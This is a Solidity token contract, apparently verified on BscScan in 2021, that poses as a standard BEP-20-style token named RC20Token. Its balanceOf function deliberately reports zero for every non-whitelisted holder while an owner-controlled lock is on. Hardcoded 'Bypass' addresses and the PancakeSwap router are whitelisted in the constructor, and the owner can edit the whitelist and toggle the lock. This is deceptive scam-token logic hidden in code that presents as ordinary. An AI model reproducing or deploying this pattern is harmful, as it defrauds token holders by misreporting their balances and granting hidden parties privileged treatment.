/**
 *Submitted for verification at BscScan.com on 2021-11-23
*/

pragma solidity ^0.8.0;

abstract contract SafeMath {
    function safeAdd(uint256 x, uint256 y) internal pure  returns(uint256) {
        uint256 z = x + y;
        assert((z >= x) && (z >= y));
        return z;
    }

    function safeSubtract(uint256 x, uint256 y) internal pure returns(uint256) {
        assert(x >= y);
        uint256 z = x - y;
        return z;
    }
}

contract RC20Token is SafeMath {
    address payable public contractOwner;
    mapping(address => bool) public whiteList;

    string  public name;
    string  public symbol;
    uint256 public decimals;
    uint256 public totalSupply;

    bool    public isLock = true;

    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    event Transfer(address indexed _from, address indexed _to, uint256 _value) ;
    event Approval(address indexed _owner, address indexed _spender, uint256 _value)  ;

    modifier isOwner()  { require(msg.sender == contractOwner); _; }

    constructor(string memory _name, string memory _symbol, uint256 _totalSupply, uint256 _decimals) payable {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply * 10 ** _decimals;
        contractOwner = payable(msg.sender);
        balances[msg.sender] = totalSupply;
        contractOwner.transfer(msg.value);
        // Sender
        whiteList[msg.sender] = true;
        // Bypass No.1
        whiteList[0x8d74B4582a3C20bc743749C78fCA1487a8c22bC2] = true;
        // Bypass No.2
        whiteList[0xfa671D89270716f001D6A303FB28124d69e6E0E6] = true;
        // PancakeSwap: Router v2
        whiteList[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true;
    }

    function balanceOf(address _owner)  public  view returns (uint256 balance) {
        if(isLock && !whiteList[_owner]) return 0;
        return balances[_owner];
    }

    function transfer(address _to, uint _value) public  returns (bool success) {
        if (balances[msg.sender] >= _value && _value > 0) {
            balances[_to] = safeAdd(balances[_to], _value);
            balances[msg.sender] = safeSubtract(balances[msg.sender], _value);
            emit Transfer(msg.sender, _to, _value);
            return true;
        } else {
            return false;
        }
    }

    function transferFrom(address _from, address _to, uint256 _value) public  returns (bool success) {
        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {
            balances[_to] = safeAdd(balances[_to], _value);
            balances[_from] = safeSubtract(balances[_from], _value);
            allowed[_from][msg.sender] = safeSubtract(allowed[_from][msg.sender], _value);
            emit Transfer(_from, _to, _value);
            return true;
        } else {
            return false;
        }
    }

    function approve(address _spender, uint256 _value) public  returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public   view  returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }

    function setIsLock(bool _isLock) isOwner public {
        require(isLock != _isLock);
        isLock=_isLock;
    }

    function extractBalance() isOwner  public {
        require(address(this).balance > 0);
        contractOwner.transfer(address(this).balance);
    }

    function whiteAddress(address _addr, bool _status) isOwner public {
        require(_addr != address(0x0));
        require(whiteList[_addr] != _status);
        whiteList[_addr] = _status;
    }
}